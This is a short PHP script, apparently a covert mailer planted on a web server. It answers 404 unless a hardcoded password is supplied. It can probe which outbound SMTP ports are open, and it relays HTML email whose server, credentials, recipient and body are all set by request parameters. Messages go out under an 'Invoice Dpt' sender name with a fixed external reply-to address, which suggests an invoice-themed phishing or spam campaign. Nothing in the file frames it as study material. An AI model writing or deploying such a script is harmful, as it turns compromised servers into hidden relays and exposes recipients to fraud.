<?php
//ini_set('display_errors', 1); ini_set('display_startup_errors', 1); error_reporting(E_ALL);
ini_set('display_errors', 0); ini_set('display_startup_errors', 0); error_reporting(E_ERROR);
date_default_timezone_set('Etc/UTC');
if(!isset($_REQUEST["pass"]) || $_REQUEST["pass"]!="pr0TecT1onPwD") {
header('HTTP/1.0 404 Not Found', true, 404);
die();
}



if(isset($_REQUEST["test"])) {
	$fp = fsockopen("ASPMX.L.GOOGLE.COM", 25, $errno, $errstr, 3);
	if (!$fp) {
		//echo "ERROR: $errno - $errstr<br />\n";
	} else {
		echo "25,";
	}
	$fp = fsockopen("mail.gmx.com", 465, $errno, $errstr, 3);
	if (!$fp) {
		//echo "ERROR: $errno - $errstr<br />\n";
	} else {
		echo "465,";
	}
	$fp = fsockopen("smtp.gmail.com", 587, $errno, $errstr, 3);
	if (!$fp) {
		//echo "ERROR: $errno - $errstr<br />\n";
	} else {
		echo "587,";
	}
	die();
}

//echo "<pre>";
//die(print_r($_REQUEST));
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\SMTP;
use PHPMailer\PHPMailer\Exception;
require 'src/Exception.php';
require 'src/PHPMailer.php';
require 'src/SMTP.php';
/*
use PHPMailer\PHPMailer;
use PHPMailer\Exception;
use PHPMailer\SMTP;
*/

// Instantiation and passing `true` enables exceptions
$mail = new PHPMailer(true);

try {
    //Server settings
    $mail->SMTPDebug = SMTP::DEBUG_SERVER;                      // Enable verbose debug output
    $mail->isSMTP();                                            // Send using SMTP
    //$mail->Host       = 'smtp.171mails.com';                    // Set the SMTP server to send through
    $mail->Host       = $_REQUEST["server"];    
    $mail->SMTPAuth   = true;                                   // Enable SMTP authentication
    $mail->Username   = $_REQUEST["user"];                     // SMTP username
    $mail->Password   = $_REQUEST["passwd"];                               // SMTP password
    $mail->SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS;         // Enable TLS encryption; `PHPMailer::ENCRYPTION_SMTPS` encouraged
    $mail->Port       = intval($_REQUEST["port"]);                                    // TCP port to connect to, use 465 for `PHPMailer::ENCRYPTION_SMTPS` above

    //Recipients
    $mail->setFrom($_REQUEST["from"], 'Invoice Dpt');
    //$mail->addAddress('joe@example.net', 'Joe User');     // Add a recipient
    $mail->addAddress($_REQUEST["to"]);               // Name is optional
    $mail->addReplyTo('monemzaga@e-infosec.com', 'Invoice Dpt');
    //$mail->addCC('cc@example.com');
    //$mail->addBCC('bcc@example.com');

    // Attachments
    //$mail->addAttachment('/var/tmp/file.tar.gz');         // Add attachments
    //$mail->addAttachment('/tmp/image.jpg', 'new.jpg');    // Optional name

    // Content
    $mail->isHTML(true);                                  // Set email format to HTML
    $mail->Subject = $_REQUEST["subject"];
    $mail->Body    = $_REQUEST["message"];
    $mail->AltBody = strip_tags($_REQUEST["message"]);

    $mail->send();
    echo 'Message has been sent';
} catch (Exception $e) {
    echo "Message could not be sent. Mailer Error: {$mail->ErrorInfo}\r\n";
}